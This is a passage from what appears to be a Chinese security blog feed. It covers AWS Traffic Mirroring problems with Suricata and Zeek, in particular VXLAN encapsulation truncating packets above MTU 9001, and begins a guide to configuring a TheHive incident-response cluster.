<li><a href="https://holdmybeersecurity.com/2019/04/03/part-1-install-setup-zeek-pf_ring-on-ubuntu-18-04-on-proxmox-5-3-openvswitch/"><strong>PART 1: INSTALL/SETUP ZEEK + PF_RING ON UBUNTU 18.04 ON PROXMOX 5.3 + OPENVSWITCH</strong></a></li>
</ul>
]]></content>
      <categories>
        <category>NIDS</category>
      </categories>
      <tags>
        <tag>Zeek</tag>
      </tags>
  </entry>
  <entry>
    <title>我在&#39;云&#39;上的日子 - AWS上流量镜像遇到的坑</title>
    <url>/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
    <content><![CDATA[<p>​    </p>
<p>​        自从AWS在6月份新出了<strong>Traffic Mirroring</strong>功能后, 我也算是第一时间使用了这个功能。与传统的交换机流量镜像不同的是, AWS上是将流量镜像后的数据通过<strong>VXLAN</strong>协议发送至流量分析引擎(<strong>Suricata</strong>、<strong>Zeek</strong>)。正是由于这一点让我碰到了以下几个问题, 这里写出来希望对大家有所帮助。</p>
<ol>
<li>接收流量镜像的目标端, 也就是我们常说的流量分析引擎端是有接收限制的。</li>
</ol>
<p>​       如果你是在一个非专用实例上部署的Suricata、Zeek。那么你只能最多同时接收10个源的流量镜像, 也就是你只能接收10个网卡的数据。很不巧的是我们碰上了这个问题, 解决方案也很简单, 使用专用实例(<strong>Dedicated instance</strong>) 或者 使用AWS的网络负载均衡(<strong>Network Load Balancer</strong>)。前者可以将Limit提升到<strong>100</strong>, 后者将<strong>不受限</strong>。如图:</p>
<p><img src="/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/image-20191016164935291.png" alt="image-20191016164935291"></p>
<hr>
<ol start="2">
<li>C5与C4实例的差异</li>
</ol>
<p>​        就我目前使用的实例而言, 分别测试过C5 与 C4两种实例。他们的网卡驱动有所区别的, 如图:</p>
<p><img src="/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/image-20191016160923628.png" alt="image-20191016160923628"></p>
<p>​        我这使用下来最直观的区别, 在C4实例上若不使用PF_RING捕包模式的话, Suricata丢包率感人, 0.5 Gbps就开始丢包。测试的机器配置: 32C 60G的机器, 切换到PF_RING捕包模式无此问题。反之C5实例就不存在这个问题, AF-PACKET直接上到2 Gbps的纯HTTP流量都没有丢包。硬件配置: 16C 32G的机器。</p>
<hr>
<ol start="3">
<li>超过<strong>MTU: 9001</strong>数据包被截断</li>
</ol>
<p>​      这几天在排查安全事件时, 发现监控的同一台Nginx上解析出的流量(HTTP事件)与日志(HTTP事件)数量相差较大。经过两天的排查终于定位了问题, Suricata kernel 并没有丢包, 所以怀疑是不是Suricata HTTP解析出错导致。最终通过抓包发现导致该问题的”罪魁祸首”就是<strong>VXLAN</strong>, 由于AWS在流量镜像时采用了<strong>VXLAN</strong>协议进行封装, 导致在原有<strong>MTU</strong>的基础上<strong>增加了50个字节</strong>, 造成数据包被截断, 无法还原出HTTP事件。以下截图就是一个无法被正确还原HTTP事件的数据包, 我用Suricata载入数据包后, 只还原出了长度<strong>9015</strong>数据包之前的HTTP信息, 长度<strong>9015</strong>数据包之后的所有事件均无法被还原。</p>
<p><img src="/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/image-20191014095249725.png" alt="image-20191014095249725"></p>
<p><img src="/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/image-20191014094741753.png" alt="image-20191014094741753"></p>
<p><strong>官方描述:</strong></p>
<p>​        For example, if an 8996 byte packet is mirrored, and the traffic mirror target MTU value is 9001 bytes, the mirror encapsulation results in the mirrored packet being greater than the MTU value. In this case, the mirror packet is truncated. To prevent mirror packets from being truncated, set the traffic mirror source interface MTU value to 54 bytes less than the traffic mirror target MTU value. For more information about configuring the network MTU value, see Network Maximum Transmission Unit (MTU) for Your EC2 Instance in the <em>Amazon EC2 User Guide for Linux Instances</em>.</p>
<p>​        例如，如果对8996字节的数据包进行了镜像，并且流量镜像目标MTU值为9001字节，则镜像封装会导致镜像的数据包大于MTU值。在这种情况下，镜像数据包将被截断。为防止镜像数据包被截断，请将流量镜像源接口的MTU值设置为比流量镜像目标MTU值小54个字节。有关配置网络MTU值的更多信息，请参阅Amazon EC2 Linux实例用户指南中的EC2实例的网络最大传输单位（MTU）。</p>
<hr>
<p><strong>关于VXLAN导致Suricata无法正常解析数据的问题, 特地进行了测试:</strong></p>
<p>准备工作:</p>
<ul>
<li>新建了<strong>test_files</strong>文件, 该文件只包含内容’<strong>hello, world!</strong>‘;</li>
<li>为了使数据包在传输时满足<strong>MTU: 9001</strong>, 手动生成了一个10MB空文件<strong>10mb_exist_files</strong>. </li>
</ul>
<p>共计访问: 14次</p>
<p>访问顺序:</p>
<ol>
<li>Client -&gt; Web Server -&gt; <strong>test_files</strong>  3 (次)</li>
<li>Client -&gt; Web Server -&gt; <strong>10mb_exist_files</strong> 1 (次)</li>
<li>Client -&gt; Web Server -&gt; <strong>test_files</strong> 10 (次)</li>
</ol>
<p>正常情况:</p>
<ul>
<li>Client -&gt; Web Server -&gt; <strong>test_files</strong>  3 (次) - 正常</li>
<li>Client -&gt; Web Server -&gt; <strong>10mb_exist_files</strong> 1 (次) - 正常</li>
<li>Client -&gt; Web Server -&gt; <strong>test_files</strong> 10 (次) - 正常</li>
</ul>
<p>异常情况:</p>
<ul>
<li>Client -&gt; Web Server -&gt; <strong>test_files</strong>  3 (次) - 正常</li>
<li>Client -&gt; Web Server -&gt; <strong>10mb_exist_files</strong> 1 (次) - 异常</li>
<li>Client -&gt; Web Server -&gt; <strong>test_files</strong> 10 (次) - 丢失</li>
</ul>
<p><strong>MTU: 9001</strong></p>
<ul>
<li>非镜像流量的数据包详情:</li>
</ul>
<p>可以看到从数据包<strong>20</strong>到数据包<strong>6126</strong>之间都是在进行<strong>10MB</strong>文件(<strong>10mb_exist_files</strong>)的传输过程。</p>
<p><img src="/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/image-20191016103409831.png" alt="image-20191016103409831"></p>
<hr>
<p>从http数据包中可以看出, 这里请求包与响应包都可以正常被还原出来。</p>
<p><img src="/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/image-20191016104502919.png" alt="image-20191016104502919"></p>
<hr>
<p>数据包在Suricata上的解析结果:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat http-2019-10-16.json | wc -l</span><br><span class="line">14</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2019-10-15T22:52:10.180505+0800&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;flow_id&quot;</span>: <span class="number">415026399241324</span>,</span><br><span class="line">    <span class="attr">&quot;pcap_cnt&quot;</span>: <span class="number">6127</span>,</span><br><span class="line">    <span class="attr">&quot;event_type&quot;</span>: <span class="string">&quot;http&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;y.y.y.y&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;src_port&quot;</span>: <span class="number">43418</span>,</span><br><span class="line">    <span class="attr">&quot;dest_ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dest_port&quot;</span>: <span class="number">8000</span>,</span><br><span class="line">    <span class="attr">&quot;proto&quot;</span>: <span class="string">&quot;TCP&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tx_id&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;http_port&quot;</span>: <span class="number">8000</span>,</span><br><span class="line">        <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/file/10mb_exist_files&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;http_user_agent&quot;</span>: <span class="string">&quot;python-requests/1.2.3 CPython/2.7.16 Linux/4.14.123-86.109.amzn1.x86_64&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;http_content_type&quot;</span>: <span class="string">&quot;text/html&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;accept_encoding&quot;</span>: <span class="string">&quot;gzip, deflate, compress&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;content_length&quot;</span>: <span class="string">&quot;41943044&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;content_type&quot;</span>: <span class="string">&quot;text/html; charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;date&quot;</span>: <span class="string">&quot;Tue, 15 Oct 2019 14:52:10 GMT&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;server&quot;</span>: <span class="string">&quot;Werkzeug/0.16.0 Python/2.7.16&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;http_method&quot;</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;HTTP/1.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;status&quot;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="attr">&quot;length&quot;</span>: <span class="number">41943044</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<ul>
<li><strong>镜像流量的数据包详情:</strong>(也就是<strong>VXLAN</strong>封装后的数据包)</li>
</ul>
<p>同样可以看到从数据包<strong>26</strong>到数据包<strong>6170</strong>之间都是在进行<strong>10MB</strong>文件(<strong>10mb_exist_files</strong>)的传输过程。但是在第<strong>34</strong>个数据包中可以看到, 已经标注了数据超出了最大长度。</p>
<p><img src="/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/image-20191016105636906.png" alt="image-20191016105636906"></p>
<hr>
<p>超出长度的数据将会被截断, 标注: <strong>50 bytes missing in capture file</strong>。</p>
<p><img src="/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/image-20191016150322620.png" alt="image-20191016150322620"></p>
<p>从HTTP数据包中可以看出, 这里只有请求包, 由于后续的响应包超出了<strong>MTU: 9001</strong>,  因此并没有响应包。</p>
<p><img src="/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/image-20191016105948606.png" alt="image-20191016105948606"></p>
<hr>
<p>数据包在Suricata上的解析结果:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat http-2019-10-16.json | wc -l</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2019-10-15T22:52:48.295823+0800&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;flow_id&quot;</span>: <span class="number">1746715371266426</span>,</span><br><span class="line">    <span class="attr">&quot;event_type&quot;</span>: <span class="string">&quot;http&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;y.y.y.y&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;src_port&quot;</span>: <span class="number">43420</span>,</span><br><span class="line">    <span class="attr">&quot;dest_ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dest_port&quot;</span>: <span class="number">8000</span>,</span><br><span class="line">    <span class="attr">&quot;proto&quot;</span>: <span class="string">&quot;TCP&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tx_id&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;http_port&quot;</span>: <span class="number">8000</span>,</span><br><span class="line">        <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/file/10mb_exist_files&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;http_user_agent&quot;</span>: <span class="string">&quot;python-requests/1.2.3 CPython/2.7.16 Linux/4.14.123-86.109.amzn1.x86_64&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;accept_encoding&quot;</span>: <span class="string">&quot;gzip, deflate, compress&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;http_method&quot;</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;HTTP/1.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;status&quot;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="attr">&quot;length&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>结论:</strong></p>
<p>​        相比非镜像流量的数据包, Suricata 少了后续10条http请求的数据解析。针对访问<strong>10mb_exist_files</strong>的请求, 由于超过了MTU, 数据包被阶段了, http的解析数据也是不完整的。</p>
<p><strong>解决方案:</strong></p>
<p>​        这里直接引用AWS的官方文档描述。如果对8996字节的数据包进行了镜像，并且流量镜像目标MTU值为9001字节，则镜像封装会导致镜像的数据包大于MTU值。在这种情况下，镜像数据包将被截断。为防止镜像数据包被截断，请将流量镜像源接口的MTU值设置为比流量镜像目标MTU值小54个字节。有关配置网络MTU值的更多信息，请参阅Amazon EC2 Linux实例用户指南中的EC2实例的网络最大传输单位（MTU）。</p>
<p>​        一般来说，降低 MTU 的话，有可能发现网路传输效能有下降，这是因为每个封包 size 变小，所以传送同样的资料量，封包数就会变多，造成 overhead 变多。但是对于传输是不会产生错误的状况的。</p>
<hr>
<p><strong>MTU:1500</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ip link show eth0</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc mq state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 02:8a:2d:87:02:8e brd ff:ff:ff:ff:ff:ff</span><br><span class="line"></span><br><span class="line">$ sudo ip link <span class="built_in">set</span> dev eth0 mtu 1500</span><br><span class="line"></span><br><span class="line">$ ip link show eth0</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 02:8a:2d:87:02:8e brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/image-20191016154823748.png" alt="image-20191016154823748"></p>
<p><img src="/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/image-20191016155112376.png" alt="image-20191016155112376"></p>
<p>数据包在Suricata上的解析结果:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat http-2019-10-16.json | wc -l</span><br><span class="line">14</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2019-10-16T15:14:15.576656+0800&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;flow_id&quot;</span>: <span class="number">1135596924232203</span>,</span><br><span class="line">    <span class="attr">&quot;event_type&quot;</span>: <span class="string">&quot;http&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;y.y.y.y&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;src_port&quot;</span>: <span class="number">43554</span>,</span><br><span class="line">    <span class="attr">&quot;dest_ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dest_port&quot;</span>: <span class="number">8000</span>,</span><br><span class="line">    <span class="attr">&quot;proto&quot;</span>: <span class="string">&quot;TCP&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tx_id&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;http_port&quot;</span>: <span class="number">8000</span>,</span><br><span class="line">        <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/file/10mb_exist_files&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;http_user_agent&quot;</span>: <span class="string">&quot;python-requests/1.2.3 CPython/2.7.16 Linux/4.14.123-86.109.amzn1.x86_64&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;http_content_type&quot;</span>: <span class="string">&quot;text/html&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;accept_encoding&quot;</span>: <span class="string">&quot;gzip, deflate, compress\n&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;content_length&quot;</span>: <span class="string">&quot;41943044&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;content_type&quot;</span>: <span class="string">&quot;text/html; charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;date&quot;</span>: <span class="string">&quot;Wed, 16 Oct 2019 07:14:15 GMT&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;server&quot;</span>: <span class="string">&quot;Werkzeug/0.16.0 Python/2.7.16&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;http_method&quot;</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;HTTP/1.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;status&quot;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="attr">&quot;length&quot;</span>: <span class="number">41943044</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        结论: <strong>MTU减小到1500时</strong>, 无论从WireShark来查看或者Suricata协议还原的角度来说, 都是可以的。</p>
<hr>
<p>​        写在最后, 说实话AWS提供了在云上的流量镜像确实很不错, 至少比传统在云上每一台机器通过安装agent把流量外发的形式强, 似乎<strong>国内</strong>的云厂商现在也没有这个功能! </p>
<p>​        不过通过VXLAN将数据包封装后导致MTU超过最大值这问题也确实有点坑。你让已经成型的架构去调整MTU值, 虽然理论上是可行, 但实际生产环境中网络的调整都是比较慎重的, 除非企业现在必须得上流量镜像, 否则不太能说服运维的小伙伴去调整, 要是真出了什么问题, 都是大问题。</p>
<p><strong>参考</strong></p>
<ul>
<li><a href="https://docs.aws.amazon.com/vpc/latest/mirroring/vpc-tm.pdf">Amazon Virtual Private Cloud Traffic Mirroring</a></li>
<li><a href="https://community.emc.com/community/support/chinese/teamblog/blog/2016/05/12/%E5%A4%A7%E5%92%96%E8%AE%B2%E7%BD%91%E7%BB%9C-mtu%E5%AF%BC%E8%87%B4%E7%9A%84%E6%82%B2%E5%89%A7">大咖讲网络-mtu导致的悲剧</a></li>
<li><a href="https://www.cnblogs.com/sammyliu/p/5079898.html">Neutron VxLAN + Linux Bridge 环境中的网络 MTU</a></li>
</ul>
]]></content>
      <categories>
        <category>NIDS</category>
      </categories>
      <tags>
        <tag>Suricata</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈TheHive平台在安全运营工作中的落地</title>
    <url>/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>​    随着企业安全建设的不断完善，信息安全的工作也进入了<em>Happy</em>（<strong>苦逼</strong>）的运营阶段。谈起安全运营工作，自然避不开事件响应这个话题。对于安全事件响应而言，我们时常会需要进行跨部门的协作。并且在某些事件中，我们甚至需要进行持续的跟踪与排查。因此，在事件的响应过程中，对于每一个响应步骤的记录显得尤为重要。它可以帮助我们在事件解决后，将经验教训纳入其中，加强整体安全能力。另一方面从自动化的角度来说，我们也应该考虑如何将响应过程转换为可被复用的<em>Playbook</em>，用以快速应对攻击，从而缩短感染攻击到遏制攻击的时间。</p>
<p>下面来说说我这的痛点，或者也可以说是我们在运营过程中所需要解决的一些问题：</p>
<ul>
<li>如何在事件响应过程中记录每一个响应步骤所花费的时间？这些任务的处理时间，将会直接影响到我们后期<em>MTTD</em>与<em>MTTR</em>的计算。</li>
<li>如何从安全事件中提炼<em>Playbook</em>？对于重复可被流程化的过程，自动化才是王道啊。</li>
<li>面对各种“<strong>骚</strong>”操作的攻击手法，如何提供更多可定制化的插件给安全分析人员使用，用以提升安全分析的效率？</li>
<li>如何快速的与现有的安全设备进行联动，并及时止损。</li>
<li>通常安全事件会涉及跨部门协作的情况，我们如何快速就此次事件展开分析并及时与协作部门之间同步事件进展。</li>
</ul>
<h1 id="安全事件响应平台-TheHive"><a href="#安全事件响应平台-TheHive" class="headerlink" title="安全事件响应平台 - TheHive"></a>安全事件响应平台 - <em>TheHive</em></h1><p>​    我最终选择了*<a href="https://thehive-project.org/"><strong>TheHive</strong></a>* 安全事件响应平台来协助我进行日常的安全运营工作。<em>TheHive</em>不同于<em>SIEM</em>这类的产品，它主要对接的是需要被真实响应的事件。个人粗略汇总了一下它的特点：</p>
<ul>
<li><strong>融合协作</strong>：<em>TheHive</em>将安全事件视作<em>Case</em>，提倡多人、跨部门之间的协作。通过分享机制，可以快速与协作部门之间同步安全事件进展。</li>
<li><strong>成本度量</strong>：<em>TheHive</em>支持记录每个<em>Case</em>、<em>Task</em>的时间成本开销。可以帮助我们更好的去度量现有的<em>MTTD、MTTR</em>指标，也为我们后期去优化指标提供了重要的依据。</li>
<li><strong>快速响应</strong>：在事件响应的过程中，你会需要对已有的数据进行分析，并迅速提供补救措施来阻止攻击。<em>TheHive</em>的<em>Cortex</em>组件支持对数据进行快速的分析，并将已确认的<em>IoC</em>自动化推送到现有的安全设备完成与<em>SIEM、WAF、FW、EDR</em>的联动。</li>
<li><strong>效率提升</strong>：对于可被流程化的响应过程，必然是需要自动化的，也就少不了日常<em>Playbook</em>的积累。那么，<em>Playbook</em>从何而来？我们可以采用<em>TheHive</em>去记录每一次的安全事件响应的过程，并通过<em>Task</em>的形式去拆分需要协作的事项以及响应的步骤，利用这种方式帮助我们去积累<em>Playbook</em>。</li>
</ul>
<h2 id="TheHive集群部署"><a href="#TheHive集群部署" class="headerlink" title="TheHive集群部署"></a><em>TheHive</em>集群部署</h2><p>​    由于篇幅的关系，这里主要介绍的是采用<em>TheHive</em>集群时需要调整的一些配置。至于如何安装<em>TheHive</em>，请参考：<a href="http://docs.thehive-project.org/thehive/installation-and-configuration/installation/step-by-step-guide/"><em><strong>Step-by-Step guide</strong></em></a>。如果只是为了测试的话，可以直接用官网提供的<em>Docker</em>或者<em>VM</em>镜像。</p>
<p>​    根据官方文档介绍，<em>TheHive</em>集群涉及4个部分。以下将会分别说明当采用<em>TheHive</em>集群时，<em>TheHive、Cortex、Cassandra、Minio</em>需要做的调整。</p>
<h3 id="Thehive"><a href="#Thehive" class="headerlink" title="Thehive"></a><em>Thehive</em></h3><p>​    我们将节点1视为主节点，通过编辑<code>/etc/thehive/application.conf</code>文件来配置<em>akka</em>组件，如下所示:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Akka server</span></span><br><span class="line"><span class="string">akka</span> &#123;</span><br><span class="line">  <span class="string">cluster.enable</span> <span class="string">=</span> <span class="string">on</span></span><br><span class="line">  <span class="string">actor</span> &#123;</span><br><span class="line">    <span class="string">provider</span> <span class="string">=</span> <span class="string">cluster</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="string">remote.artery</span> &#123;</span><br><span class="line">    <span class="string">canonical</span> &#123;</span><br><span class="line">      <span class="string">hostname</span> <span class="string">=</span> <span class="string">&quot;&lt;My IP address&gt;&quot;</span></span><br><span class="line">      <span class="string">port</span> <span class="string">=</span> <span class="number">2551</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="comment"># seed node list contains at least one active node</span></span><br><span class="line">  <span class="string">cluster.seed-nodes</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;akka://application@&lt;Node 1 IP address&gt;:2551&quot;</span>,</span><br><span class="line">    <span class="string">&quot;akka://application@&lt;Node 2 IP address&gt;:2551&quot;</span>,</span><br><span class="line">    <span class="string">&quot;akka://application@&lt;Node 3 IP address&gt;:2551&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Cassandra"><a href="#Cassandra" class="headerlink" title="Cassandra"></a><em>Cassandra</em></h3><ul>
<li><p>集群配置</p>
<ul>
<li>使用以下参数更新配置文件：<code>/etc/cassandra/cassandra.yaml</code></li>
</ul>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">cluster_name:</span> <span class="string">&#x27;thp&#x27;</span></span><br><span class="line"><span class="attr">num_tokens:</span> <span class="number">256</span></span><br><span class="line"><span class="attr">authenticator:</span> <span class="string">PasswordAuthenticator</span></span><br><span class="line"><span class="attr">authorizer:</span> <span class="string">CassandraAuthorizer</span></span><br><span class="line"><span class="attr">role_manager:</span> <span class="string">CassandraRoleManager</span></span><br><span class="line"><span class="attr">data_file_directories:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/var/lib/cassandra/data</span></span><br><span class="line"><span class="attr">commitlog_directory:</span> <span class="string">/var/lib/cassandra/commitlog</span></span><br><span class="line"><span class="attr">saved_caches_directory:</span> <span class="string">/var/lib/cassandra/saved_caches</span></span><br><span class="line"><span class="attr">seed_provider:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">org.apache.cassandra.locator.SimpleSeedProvider</span></span><br><span class="line">      <span class="attr">parameters:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">seeds:</span> <span class="string">&quot;&lt;ip node 1&gt;, &lt;ip node 2&gt;, &lt;ip node 3&gt;&quot;</span></span><br><span class="line"><span class="attr">listen_interface :</span> <span class="string">ens160</span>	<span class="comment"># 监听的接口</span></span><br><span class="line"><span class="attr">rpc_interface:</span> <span class="string">ens160</span>	<span class="comment"># 监听的接口</span></span><br><span class="line"><span class="attr">endpoint_snitch:</span> <span class="string">SimpleSnitch</span></span><br></pre></td></tr></table></figure>

<ul>
<li>删除文件 <code>/etc/cassandra/cassandra-topology.properties</code></li>
</ul>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">rm</span> <span class="string">-rf</span> <span class="string">/etc/cassandra/cassandra-topology.properties</span></span><br></pre></td></tr></table></figure></li>
<li><p>启动服务</p>
<ul>
<li>在每个节点上启动服务</li>
</ul>
